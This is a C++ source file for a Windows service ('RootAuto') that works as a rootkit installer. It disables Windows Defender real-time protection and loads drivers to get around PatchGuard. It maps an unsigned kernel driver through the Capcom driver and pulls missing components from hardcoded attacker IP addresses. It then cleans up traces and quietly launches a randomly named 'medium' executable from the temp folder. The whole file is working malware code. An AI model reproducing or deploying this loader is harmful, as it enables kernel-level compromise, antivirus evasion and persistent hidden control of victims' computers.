#include <iostream>
#include <sys/types.h>
#include <sys/stat.h>
#include "helpers.h"
#include "utils.h"
#include "services.h"


// Declerations for used functions -
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);  // actual Main() of service, initiates service operations
VOID WINAPI ServiceControlHandler(DWORD);  // controls events, like IRP_MJ_DEVICE_CONTROL in KM
DWORD WINAPI ServiceMainThread(LPVOID lpParam);  // main thread, actually activates the medium service and maps the driver


DWORD WINAPI ServiceMainThread(LPVOID lpParam)
{
    std::wstring NondGuardPath(GetCurrentPath() + L"\\GuardMon.sys");  // Used for if default not existing
    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
    LogFile InitLog = { 0 };
    struct stat CheckExists = { 0 };
    char MediumName[MAX_PATH] = { 0 };
    
    HANDLE TempFile = INVALID_HANDLE_VALUE;
    HANDLE MediumFile = INVALID_HANDLE_VALUE;
    HANDLE SafeHandle = INVALID_HANDLE_VALUE;

    PVOID MediumBuffer = NULL;
    PVOID SafeBuffer = NULL;
    DWORD MediumSize = 0;
    DWORD MediumRead = 0;
    DWORD MediumWritten = 0;
    DWORD SafeSize = 0;

    BOOL GotIp = FALSE;
    BOOL GotMedium = FALSE;
    BOOL GotMapper = FALSE;
    BOOL GotGuard = FALSE;
    BOOL DriverExists = TRUE;
    
    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
    char TempPath[MAX_PATH] = { 0 };
    char RandMedium[MAX_PATH] = { 0 };
    char GuardCommand[] = "sc create GuardMon type= kernel binPath= ~";
    char ExistingCommand[500] = { 0 };
    char CurrentPath[500] = { 0 };
    char GuardPath[500] = { 0 };
    WcharpToCharp(CurrentPath, GetCurrentPath().c_str());
    WcharpToCharp(CurrentPath, NondGuardPath.c_str());

    const char* DeleteExisting = "if exist * rmdir /s /q *";
    const char* CleaningCommands =
        "cd \"%ProgramFiles%\\Windows Defender\" && "
        "MpCmdRun.exe - Restore - All && "
        "sc stop Capcom && "
        "sc delete Capcom && "
        "del %windir%\\Capcom.sys";
    const char* AttackAddresses = "172.25.112.1~172.31.240.1~172.23.144.1~172.23.224.1~172.26.192.1~172.17.160.1~172.27.144.1~192.168.47.1~192.168.5.1~192.168.1.21~172.28.224.1~192.168.56.1";

    
    // Enable active log file -
    LastError.LastError = InitLog.InitiateFile("C:\\nosusfolder\\verysus\\ServiceLog.txt");
    if (LastError.LastError != 0) {
        return FALSE;
    }


    // Disable Realtime Protection -
    LastError = RealTime(TRUE, &InitLog);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        return FALSE;
    }


    // Disable patchguard -
    if (stat("C:\\nosusfolder\\verysus\\GuardMon.sys", &CheckExists) != 0) {
        InitLog.WriteLog((PVOID)"[i] Default guardmon didnt exist!\n", 35);
        if (!GotIp) {
            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
                return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for guardmon - ", NULL, 0, &InitLog);
            }
            GotIp = TRUE;
        }

        if (!FailSafe('K', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "[-] FailSafe of guardmon failed - ", NULL, 0, &InitLog);
        }

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            InitLog.CloseLog();
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "GuardMon.sys")) {
            return SpecialQuit(0, "[-] AfterFailSafe for guardmon failed - ", NULL, 0, &InitLog);
        }
    }
    else {
        GotGuard = TRUE;
    }
    InitLog.WriteLog((PVOID)"[+] Got guardmon!\n", 19);
    if (stat("C:\\nosusfolder\\verysus\\DrvLoader.exe", &CheckExists) != 0) {
        InitLog.WriteLog((PVOID)"[i] Default drvloader didnt exist!\n", 36);
        if (!GotIp) {
            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
                return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for drvloader - ", NULL, 0, &InitLog);
            }
            GotIp = TRUE;
        }

        if (!FailSafe('L', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "[-] FailSafe of drvloader failed - ", NULL, 0, &InitLog);
        }
        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            InitLog.CloseLog();
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "DrvLoader.exe")) {
            return SpecialQuit(0, "[-] AfterFailSafe for drvloader failed - ", NULL, 0, &InitLog);
        }
        
        if (GotGuard) {
            InitLog.WriteLog((PVOID)"[i] Executing command DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys..\n", 75);
            LastError.LastError = system("DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys");
        }
        else {
            InitLog.WriteLog((PVOID)"[i] Executing command DrvLoader.exe GuardMon.sys..\n", 52);
            LastError.LastError = system("DrvLoader.exe GuardMon.sys");
        }
    }
    else {
        if (GotGuard) {
            InitLog.WriteLog((PVOID)"[i] Executing command C:\\nosusfolder\\verysus\\DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys..\n", 98);
            LastError.LastError = system("C:\\nosusfolder\\verysus\\DrvLoader.exe C:\\nosusfolder\\verysus\\GuardMon.sys");
        }
        else {
            InitLog.WriteLog((PVOID)"[i] Executing command C:\\nosusfolder\\verysus\\DrvLoader.exe GuardMon.sys..\n", 75);
            LastError.LastError = system("C:\\nosusfolder\\verysus\\DrvLoader.exe GuardMon.sys");
        }
    }
    if (LastError.LastError == -1) {
        return SpecialQuit(GetLastError(), "[-] Loading GuardMon.sys with DrvLoader.exe failed - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Loaded GuardMon.sys with DrvLoader.exe successfully!\n", 58);


    // Make sure calling command is syntaxed correctly and that driver is available -
    if (stat("C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys", &CheckExists) != 0) {
        if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
            InitLog.CloseLog();
            return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for driver - ", NULL, 0, &InitLog);
        }
        GotIp = TRUE;

        if (!FailSafe('D', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "[-] FailSafe of driver failed - ", NULL, 0, &InitLog);
        }

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            InitLog.CloseLog();
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "KMDFdriver.sys")) {
            return SpecialQuit(0, "[-] After FailSafe of driver failed - ", NULL, 0, &InitLog);
        }
        DriverExists = FALSE;
    }
    InitLog.WriteLog((PVOID)"[+] Made sure that medium file exists!\n", 40);


    // Make sure calling command is syntaxed correctly and that drvmap.exe is available -
    if (stat("C:\\nosusfolder\\verysus\\drvmap.exe", &CheckExists) != 0) {
        if (!GotIp) {
            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
                return SpecialQuit(0, "[-] Failed to get IP addresses of target and attacker for mapper - ", NULL, 0, &InitLog);
            }
            GotIp = TRUE;
        }

        if (!FailSafe('P', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "[-] FailSafe of mapper failed - ", NULL, 0, &InitLog);
        }

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            InitLog.CloseLog();
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "drvmap.exe")) {
            return SpecialQuit(0, "[-] AfterFailSafe for mapper failed - ", NULL, 0, &InitLog);
        }

        if (!DriverExists) {
            LastError.LastError = system("drvmap.exe KMDFdriver.sys");
        }
        else {
            LastError.LastError = system("drvmap.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys");
        }
    }
    else {
        if (!DriverExists) {
            LastError.LastError = system("C:\\nosusfolder\\verysus\\drvmap.exe KMDFdriver.sys");
        }
        else {
            LastError.LastError = system("C:\\nosusfolder\\verysus\\drvmap.exe C:\\nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys");
        }
    }
    InitLog.WriteLog((PVOID)"[+] Made sure that mapper file exists!\n", 40);


    // Activate drvmap with driver as parameter -
    if (LastError.LastError == -1) {
        return SpecialQuit(GetLastError(), "[-] Failed to activate drvmap.exe with driver as parameter - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Activated drvmap.exe with driver as a parameter!\n", 54);
    
    
    // Perform cleaning commands -
    if (system(CleaningCommands) == -1) {
        return SpecialQuit(GetLastError(), "[-] Failed to perform cleaning commands - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Performed cleaning commands!\n", 34);


    // Enable Realtime Protection -
    LastError = RealTime(FALSE, &InitLog);
    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
        return FALSE;
    }


    // Get medium data -
    MediumFile = CreateFileA("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (MediumFile == INVALID_HANDLE_VALUE) {
        if (stat("C:\\nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe", &CheckExists) == 0) {
            return SpecialQuit(GetLastError(), "[-] Error while trying to read default medium - ", NULL, 0, &InitLog);
        }
        InitLog.WriteLog((PVOID)"[i] Default medium file does not exist on target!\n", 51);

        if (!GotIp) {
            if (!GetAddresses(TargetIp, AttackerIp, AttackAddresses)) {
                return SpecialQuit(0, "[-] Error while trying to get IP addresses of attacker and target for medium - ", NULL, 0, &InitLog);
            }
            GotIp = TRUE;
        }

        if (!FailSafe('M', AttackerIp, TargetIp, &SafeHandle, &SafeSize)) {
            return SpecialQuit(0, "[-] Failed to execute FailSafe for medium - ", NULL, 0, &InitLog);
        }
        InitLog.WriteLog((PVOID)"[i] FailSafe for medium succeeded!\n", 36);

        SafeBuffer = malloc(SafeSize);
        if (SafeBuffer == NULL) {
            CloseHandle(SafeHandle);
            InitLog.CloseLog();
            return FALSE;
        }

        if (!AfterFailSafe(SafeHandle, SafeSize, SafeBuffer, "MainMedium.exe")) {
            return SpecialQuit(0, "[-] Failed to execute AfterFailSafe for medium - ", NULL, 0, &InitLog);
        }
        InitLog.WriteLog((PVOID)"[i] AfterFailSafe for medium succeeded!\n", 41);

        GotMedium = TRUE;
        MediumBuffer = SafeBuffer;
        MediumSize = SafeSize;
    }
    InitLog.WriteLog((PVOID)"[+] Got medium file handle!\n", 36);

    if (!GotMedium) {
        MediumSize = GetFileSize(MediumFile, NULL);
        if (MediumSize == 0) {
            HANDLE CloseArr[1] = { MediumFile };
            return SpecialQuit(GetLastError(), "[-] Failed to get size of medium for creating temp copy - ", CloseArr, 1, &InitLog);
        }
        MediumBuffer = malloc(MediumSize);
        if (MediumBuffer == NULL) {
            HANDLE CloseArr[1] = {MediumFile};
            return SpecialQuit(GetLastError(), "[-] Failed to allocate memory for medium for creating temp copy - ", CloseArr, 1, &InitLog);
        }

        if (!ReadFile(MediumFile, MediumBuffer, MediumSize, &MediumRead, NULL) || MediumRead != MediumSize) {
            HANDLE CloseArr[1] = { MediumFile };
            free(MediumBuffer);
            return SpecialQuit(GetLastError(), "[-] Failed to read medium data into buffer - ", CloseArr, 1, &InitLog);
        }
        CloseHandle(MediumFile);
    }
    InitLog.WriteLog((PVOID)"[+] Got medium data in buffer!\n", 32);


    // Get path to temp copy of medium file -
    if (GetTempPathA(MAX_PATH, TempPath) == 0) {
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to get the temp path of machine for temp medium - ", NULL, 0, &InitLog);
    }
    GetRandomName(RandMedium, 20, ".exe");
    memcpy((PVOID)((ULONG64)TempPath + strlen(TempPath)), RandMedium, strlen(RandMedium) + 1);


    // Stop and delete existing instance of medium if theres one (temp copy of medium) -
    if (stat(TempPath, &CheckExists) == 0) {
        InitLog.WriteLog((PVOID)"[i] Temp copy of medium with the same name already exists!\n", 60);
        GetServiceName(TempPath, MediumName);
        REPLACEMENT Rep = { MediumName, '*', 1 };
        REPLACEMENT RepArr[1] = { Rep };
        LastError.LastError = ExecuteSystem("taskkill /IM * /F", RepArr, 1);
        if (LastError.LastError != 0) {
            free(MediumBuffer);
            return SpecialQuit(LastError.LastError, "[-] Failed to stop existing temp copy of medium - ", NULL, 0, &InitLog);
        }

        Rep = { TempPath, '*', 2 };
        RepArr[0] = Rep;
        LastError.LastError = ExecuteSystem("if exist * del /s /q *", RepArr, 1);
        if (LastError.LastError != 0) {
            free(MediumBuffer);
            return SpecialQuit(LastError.LastError, "[-] Failed to delete existing medium temp copy - ", NULL, 0, &InitLog);
        }
        InitLog.WriteLog((PVOID)"[i] Killed and deleted already existing temp medium copy with the same name as the current!\n", 93);
    }


    // Stop already running medium, remove source file, create new temp medium instance -
    if (!DeletePrevious(TempPath, &InitLog)) {
        return SpecialQuit(GetLastError(), "[-] DeletePrevious medium failed - ", NULL, 0, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] DeletePrevious succeeded!\n", 31);

    TempFile = CreateFileA(TempPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (TempFile == INVALID_HANDLE_VALUE) {
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to create temp copy of medium - ", NULL, 0, &InitLog);
    }
    if (!WriteFile(TempFile, MediumBuffer, MediumSize, &MediumWritten, NULL) || MediumWritten != MediumSize) {
        HANDLE CloseArr[1] = { TempFile };
        free(MediumBuffer);
        return SpecialQuit(GetLastError(), "[-] Failed to write into new temp copy of medium - ", CloseArr, 1, &InitLog);
    }
    InitLog.WriteLog((PVOID)"[+] Creating new temp copy of medium succeeded!\n", 49);
    free(MediumBuffer);
    CloseHandle(TempFile);


    // Activate medium -
    HINSTANCE MediumProcess = ShellExecuteA(NULL, "open", TempPath, NULL, NULL, SW_HIDE);
    if ((INT_PTR)MediumProcess > 32) {
        InitLog.WriteLog((PVOID)"[+] Ran medium, overall success!\n", 34);
        InitLog.CloseLog();
        return ERROR_SUCCESS;
    }
    InitLog.WriteError("[-] Failed to run medium process - ", (DWORD)MediumProcess);
    InitLog.CloseLog();
    return (DWORD)MediumProcess;
}


VOID WINAPI ServiceControlHandler(DWORD CtrlCode)
{
    switch (CtrlCode)
    {
    case SERVICE_CONTROL_STOP:

        if (AutomaticService.ServiceStatus.dwCurrentState != SERVICE_RUNNING)
            break;

        AutomaticService.ServiceStatus.dwControlsAccepted = 0;
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 4;

        SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
        SetEvent(AutomaticService.StopEvent);  // Initiate the stop event - main working thread will be notified to stop working
        break;

    default:
        break;  // No need to handle any other type of events
    }
}


VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
{
    DWORD Status = E_FAIL;

    // Register the service control handler with the SCM so its possible to control the service -
    AutomaticService.StatusHandle = RegisterServiceCtrlHandler(AutomaticService.ServiceName, ServiceControlHandler);
    if(AutomaticService.StatusHandle != NULL) {
        // Initialize service status with values to show service controller the service is starting -
        RtlZeroMemory(&AutomaticService.ServiceStatus, sizeof(AutomaticService.ServiceStatus));
        AutomaticService.ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
        AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
        AutomaticService.ServiceStatus.dwCurrentState = SERVICE_START_PENDING;  // Intending to eventually start
        AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
        AutomaticService.ServiceStatus.dwServiceSpecificExitCode = 0;
        AutomaticService.ServiceStatus.dwCheckPoint = 0;

        if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
            AutomaticService.StopEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
            if (AutomaticService.StopEvent == NULL) {
                // Error creating the event that occurs when stopping the service (need to stop service manually) -
                AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // For now, no interaction with the service is accepted
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped
                AutomaticService.ServiceStatus.dwWin32ExitCode = GetLastError();
                AutomaticService.ServiceStatus.dwCheckPoint = 1;
                SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
            }
            else {
                // Created stopping event successfully, proceed to start the service -
                AutomaticService.ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;  // Only accepted interaction with service is stopping it
                AutomaticService.ServiceStatus.dwCurrentState = SERVICE_RUNNING;  // Service is currently running
                AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESSFUL
                AutomaticService.ServiceStatus.dwCheckPoint = 0;
                if (SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus)) {
                    AutomaticService.MainThread = CreateThread(NULL, 0, ServiceMainThread, NULL, 0, NULL);
                    if (AutomaticService.MainThread != NULL) {
                        WaitForSingleObject(AutomaticService.MainThread, INFINITE);  // Wait for main thread to stop operating
                    }
                    CloseHandle(AutomaticService.StopEvent);  // Stop event not needed anymore

                    // Update final status of service (stopping after main operation) -
                    AutomaticService.ServiceStatus.dwControlsAccepted = 0;  // No interaction with service should occur when stopping
                    AutomaticService.ServiceStatus.dwCurrentState = SERVICE_STOPPED;  // Service has stopped operating
                    AutomaticService.ServiceStatus.dwWin32ExitCode = 0;  // STATUS_SUCCESS
                    AutomaticService.ServiceStatus.dwCheckPoint = 3;
                    SetServiceStatus(AutomaticService.StatusHandle, &AutomaticService.ServiceStatus);
                }
            }
        }
    }
    return;
}


int main(int argc, TCHAR* argv[])
{
    char AutoName[11] = "RootAuto";
    WCHAR WideAutoName[MAX_PATH];
    CharpToWcharp(AutoName, WideAutoName);
    AutomaticService.InitiateService(WideAutoName);
    AutomaticService.ServiceFile = "C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe";

    // Define the service table entry of the auto service (name, entrypoint ..) -
    SERVICE_TABLE_ENTRY ServiceTable[] = {
        {AutomaticService.ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
        {NULL, NULL}
    };


    // Start the service control dispatcher (used by SCM to call the service) -
    if (StartServiceCtrlDispatcher(ServiceTable) == FALSE) {
        return GetLastError();
    }
    return 0;
}